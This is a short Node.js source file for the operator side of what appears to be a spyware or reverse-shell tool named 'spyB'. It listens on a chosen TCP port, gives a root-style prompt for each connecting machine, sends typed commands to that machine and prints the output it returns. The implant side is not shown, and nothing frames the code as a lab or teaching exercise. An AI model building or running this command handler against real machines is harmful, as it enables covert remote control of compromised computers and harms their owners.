// @ts-check

import { createServer } from "node:net";
import { createInterface } from "node:readline";

const socket = createServer();

const input = createInterface({
  input: process.stdin,
  output: process.stdout,
});

socket.on("connection", (client) => {
  const clientIp = String(client.remoteAddress).replace("::ffff:", "");

  cmd(client);

  client.on("data", (data) => {
    const result = data.toString();

    console.log(`\n${result}`);

    cmd(client);
  });

  client.on("end", () => {
    console.log(`${clientIp} disconnected`);
    process.exit();
  });
});

/**
 * @param {import("net").Socket} client
 */
function cmd(client) {
  const clientIp = String(client.remoteAddress).replace("::ffff:", "");

  input.question(`spyB@${clientIp}:# `, (command) => {
    client.write(command);
  });
}

const PORT = process.argv[2];

if (!PORT) {
  console.error("Please specify a port");
  process.exit();
}

socket.listen(PORT).on("listening", () => {
  console.log(`Listening on port ${PORT}`);
});
